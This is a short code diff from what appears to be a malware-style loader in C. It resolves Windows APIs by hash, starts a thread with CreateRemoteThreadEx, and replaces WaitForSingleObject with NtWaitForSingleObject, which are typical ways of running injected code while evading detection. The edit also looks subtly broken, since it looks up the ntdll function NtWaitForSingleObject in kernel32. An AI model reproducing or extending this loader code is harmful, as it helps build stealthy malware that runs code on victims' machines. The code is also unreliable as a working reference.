@@ -7,7 +7,7 @@
 
 BOOL execution_load_apis() {
 	g_ldr->apis->CreateRemoteThreadEx = (pCreateRemoteThreadEx)GetProc(g_ldr->apis->modules.kernel32, HASHED_CREATEREMOTETHREADEX);
-	g_ldr->apis->WaitForSingleObject = (pWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_WAITFORSINGLEOBJECT);
+	g_ldr->apis->NtWaitForSingleObject = (pNtWaitForSingleObject)GetProc(g_ldr->apis->modules.kernel32, HASHED_NTWAITFORSINGLEOBJECT);
 	return TRUE;
 }
 
@@ -17,7 +17,8 @@ BOOL execution_run(MemoryInfo memInfo) {
 		NULL,
 		0, NULL, NULL);
 	if (hThread == NULL) return FALSE;
-	g_ldr->apis->WaitForSingleObject(hThread, INFINITE);
+	g_ldr->apis->NtWaitForSingleObject(hThread, FALSE, NULL);
+
 	return TRUE;
 }
 
